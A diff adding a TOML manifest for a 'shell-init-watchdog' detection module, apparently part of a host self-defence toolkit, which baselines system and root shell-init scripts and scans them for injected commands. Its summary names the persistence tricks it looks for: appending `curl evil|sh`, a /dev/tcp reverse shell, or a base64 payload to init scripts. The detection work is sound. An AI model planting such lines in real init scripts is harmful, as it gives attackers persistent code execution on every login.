@@ -1,0 +1,41 @@
+name        = "shell-init-watchdog"
+version     = "0.1.0"
+summary     = "Boot + daily delta of the global + root shell-init scripts (/etc/profile, /etc/bash.bashrc|/etc/bashrc, /etc/profile.d/*.sh, /etc/zsh/*, root's ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc) vs a learned baseline, AND a suspicious-pattern scan for command injection. An attacker who appends `curl evil|sh`, a /dev/tcp reverse shell, or base64-decoded payload to any init script gets code-exec on every interactive login/shell (T1546.004). Distinct from ld-preload-watchdog, which scans the same files only for LD_PRELOAD"
+category    = "detection"
+
+depends_on  = []
+conflicts   = []
+provides    = ["shell-init-detection"]
+consumes    = []
+
+requires    = [
+    { kind = "binary", value = "sha256sum" },
+    { kind = "binary", value = "logger" },
+    { kind = "binary", value = "systemctl" },
+]
+
+instanced = false
+phase = "main"
+
+[install]
+kind = "script"
+apply = "install/apply.sh"
+check = "install/check.sh"
+uninstall = "install/uninstall.sh"
+
+[profiles]
+# `report` (default) — log delta; exit 0
+# `enforce`          — exit 1 on any shell-init change
+default = "report"
+available = ["report", "enforce"]
+
+# MS011 Z-8 / SDD-026 — install-path manifest.
+[install_paths]
+scope = "system"
+paths = [
+    "/etc/selfdef/modules/shell-init-watchdog.toml",
+    "/usr/local/libexec/selfdef/shell-init-watchdog.sh",
+    "/etc/systemd/system/selfdef-shell-init.service",
+    "/etc/systemd/system/selfdef-shell-init.timer",
+    "/var/lib/selfdef/shell-init-baseline.tsv",
+]
